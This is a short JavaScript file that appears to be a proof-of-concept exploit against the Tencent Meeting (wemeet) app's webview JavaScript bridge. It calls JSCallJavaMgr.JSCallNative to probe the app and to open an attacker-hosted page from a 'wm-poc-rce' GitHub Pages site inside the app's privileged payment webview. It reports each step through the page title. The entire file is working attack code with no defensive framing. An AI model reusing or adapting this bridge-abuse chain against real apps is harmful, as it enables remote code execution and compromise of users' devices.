(function(){
  document.title='P141TB:'+location.host;
  window.__p=function(r){
    try{r=typeof r==='string'?JSON.parse(r):r}catch(e){}
    document.title='P141CB:'+(r&&r.callId)+':'+location.host+':'+(r&&r.code)+':'+String(r&&r.message||JSON.stringify(r&&r.data||{})).slice(0,80);
  };
  function c(id,mod,m,p){
    try{
      window.JSCallJavaMgr.JSCallNative(JSON.stringify({
        callback:'window.__p',module:mod,method:m,param:p,callId:id
      }));
    }catch(e){
      document.title='P141TB-NOJS:'+location.host;
    }
  }
  if(!window.JSCallJavaMgr){document.title='P141TB-NOMGR:'+location.host;return}
  var main='https://gitwhs.github.io/wm-poc-rce/p141main.html';
  var official='https://meeting.tencent.com/v2/webview/keep-app-alive';
  var q=[
    ['H2','CommonPlugin','GetPerformance',{}],
    ['OP','CommonPlugin','OpenNewPage',{
      scheme:'wemeet://page/pay/main_process_webview',
      router_params:{url:main}
    }],
    ['NX','CommonPlugin','OpenNewPage',{
      scheme:'wemeet://page/nxui/webview',
      router_params:{url:official}
    }]
  ];
  var i=0;
  function n(){
    if(i>=q.length){document.title='P141TB-DONE:'+location.host;return}
    var x=q[i++];
    document.title='P141-RUN:'+x[0];
    c(x[0],x[1],x[2],x[3]);
    setTimeout(n, 4000);
  }
  setTimeout(n, 800);
})();
